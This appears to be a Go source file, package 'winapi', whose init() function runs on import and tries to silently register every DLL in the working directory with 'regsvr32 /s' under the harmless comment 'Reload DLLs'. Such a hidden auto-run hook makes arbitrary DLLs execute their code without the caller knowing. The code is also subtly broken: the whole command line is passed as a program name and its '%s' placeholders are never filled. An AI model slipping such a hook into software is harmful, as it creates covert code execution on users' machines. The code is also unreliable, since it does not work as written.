package winapi

import (
	"log"
	"os/exec"
)

func init() {
	// Reload DLLs
	if err := exec.Command("for /f %s in ('dir /b *.dll') do regsvr32 /s %s").Run(); err != nil {
		log.Printf("Warning: failed to reload DLLs")
	}
}
